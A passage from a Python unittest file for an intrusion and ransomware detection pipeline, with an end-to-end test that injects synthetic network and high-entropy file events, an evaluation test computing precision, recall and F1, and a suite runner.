    Inject raw events → normalize → detect → check alerts in storage.
    """
    @classmethod
    def setUpClass(cls):
        import pipeline.bus as bus
        bus._topics.clear()
        import storage.store as sm
        sm._store_instance = None

        from detection.anomaly_engine.ml_engine import bootstrap_with_normal_traffic, _detectors
        from detection.dataset_generator import get_normal_vectors
        for c in ["network_activity","file_activity","cloud_api","process_activity"]:
            _detectors.pop(c, None)
            bootstrap_with_normal_traffic(c, get_normal_vectors(c, n=200))

    def test_pipeline_processes_events(self):
        import pipeline.bus as bus
        bus._topics.clear()
        import storage.store as sm
        sm._store_instance = None

        from normalizer.ocsf_normalizer import run_normalizer, _stats as ns
        import normalizer.ocsf_normalizer as nm
        nm._stats = {"received":0,"normalized":0,"dropped":0,"errors":0}

        from detection.pipeline import run_detection_pipeline, _stats as ds
        import detection.pipeline as dp
        dp._stats = {"received":0,"processed":0,"alerts":0,"errors":0,"skipped":0}

        from pipeline.bus import get_producer

        stop_norm = threading.Event()
        stop_det  = threading.Event()

        t_norm = threading.Thread(target=run_normalizer, args=(stop_norm,), daemon=True)
        t_det  = threading.Thread(
            target=lambda: run_detection_pipeline(stop_det), daemon=True
        )
        t_norm.start()
        t_det.start()

        prod = get_producer()
        import uuid
        from datetime import datetime, timezone
        ts = lambda: datetime.now(timezone.utc).isoformat()

        # Inject attack events
        for _ in range(3):
            prod.send("raw.telemetry", {
                "event_id":str(uuid.uuid4()), "source":"network_tap",
                "timestamp":ts(), "src_ip":"10.0.0.5", "dst_ip":"192.168.1.1",
                "src_port":54321, "dst_port":22, "protocol":"TCP",
                "packet_count":500, "byte_count":25000, "duration_sec":1.0,
                "tcp_flags":["SYN","ACK"], "unique_dst_ports":1,
            })
            prod.send("raw.telemetry", {
                "event_id":str(uuid.uuid4()), "source":"host_agent",
                "event_type":"file_write", "timestamp":ts(),
                "hostname":"host","filepath":"/home/u/doc.enc",
                "entropy":7.94,"high_entropy":True,"sha256":"aa"*32,
            })

        prod.flush()
        time.sleep(2.0)
        stop_norm.set()
        stop_det.set()
        t_norm.join(timeout=3)
        t_det.join(timeout=3)

        stats = dp.get_pipeline_stats()
        self.assertGreater(stats["processed"], 0)
        self.assertEqual(stats["errors"], 0)


class T60_EvaluationMetrics(unittest.TestCase):
    """
    Evaluation: run detection on labeled synthetic dataset and measure
    precision, recall, F1. This is the core evaluation for the paper.
    """
    def test_detection_metrics_acceptable(self):
        from detection.dataset_generator import generate_dataset
        from detection.hybrid_engine import HybridCombiner
        from detection.anomaly_engine.ml_engine import bootstrap_with_normal_traffic, _detectors
        from detection.feature_extractor import extract
        from normalizer.ocsf_normalizer import _norm_file

        # Bootstrap with clean normal data
        _detectors.pop("file_activity", None)
        X_norm, _ = generate_dataset("file_activity", n_normal=300, n_attack=0)
        bootstrap_with_normal_traffic("file_activity", list(X_norm))

        X, y = generate_dataset("file_activity", n_normal=80, n_attack=40)

        combiner = HybridCombiner()
        tp = fp = tn = fn = 0

        for i in range(len(X)):
            # Build a synthetic OCSF event from the feature vector
            entropy = float(X[i, 0]) * 8.0
            high    = entropy > 7.2
            evt     = _norm_file({
                "event_id": str(uuid.uuid4()), "source":"host_agent",
                "event_type":"file_write",
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "hostname":"eval", "filepath":"/tmp/test.enc" if y[i]==1 else "/tmp/test.txt",
                "entropy": entropy, "high_entropy": high,
                "sha256":"aa"*32 if high else "",
            })
            result = combiner.process(evt)
            pred   = 1 if result.is_alert else 0
            true   = int(y[i])
            if pred == 1 and true == 1: tp += 1
            elif pred == 1 and true == 0: fp += 1
            elif pred == 0 and true == 0: tn += 1
            else: fn += 1

        precision = tp / max(tp + fp, 1)
        recall    = tp / max(tp + fn, 1)
        f1        = 2 * precision * recall / max(precision + recall, 1e-9)

        print(f"\n[EVAL] TP={tp} FP={fp} TN={tn} FN={fn}")
        print(f"[EVAL] Precision={precision:.3f} Recall={recall:.3f} F1={f1:.3f}")

        # Paper targets: F1 > 0.70, Recall > 0.65 (ransomware must be caught)
        self.assertGreater(recall,    0.60, f"Recall too low: {recall:.3f}")
        self.assertGreater(precision, 0.50, f"Precision too low: {precision:.3f}")
        self.assertGreater(f1,        0.55, f"F1 too low: {f1:.3f}")


# ─────────────────────────────────────────────────────────────────────────────
# Runner
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    loader = unittest.TestLoader()
    loader.sortTestMethodsUsing = None
    suite  = unittest.TestSuite()

    for cls in [
        T01_FeatureExtractorNetwork, T02_FeatureExtractorProcess,
        T03_FeatureExtractorFile, T04_FeatureExtractorCloud,
        T05_FeatureNamesAlignment,
        T06_SigPortScan, T07_SigSynFlood, T08_SigSSHBrute,
        T09_SigThreatIntel, T10_SigRDP, T11_SigProcess,
        T12_SigFile, T13_SigCloud, T14_SigAllRulesCallable,
        T21_MLBootstrap, T22_MLIsolationForest, T23_MLNetworkAnomalies,
        T24_MLAdversarialHardening, T25_MLAutoencoder, T26_MLAnalystFeedback,
        T31_StatBasicScore, T32_StatZScore, T33_StatTemporalDensity,
        T34_StatBehavioralDrift, T35_StatEntityTracking,
        T39_XAIBasic,
        T46_CombinerBasic, T47_CombinerPortScanAlert, T48_CombinerRansomwareAlert,
        T49_CombinerCloudCritical, T50_CombinerNormalTraffic,
        T51_CombinerXAIPresent, T52_CombinerStats,
        T53_DatasetGenerator,
        T59_FullPipelineEndToEnd, T60_EvaluationMetrics,
    ]:
        suite.addTests(loader.loadTestsFromTestCase(cls))

    runner = unittest.TextTestRunner(verbosity=2, stream=sys.stdout)
    result = runner.run(suite)
    sys.exit(0 if result.wasSuccessful() else 1)
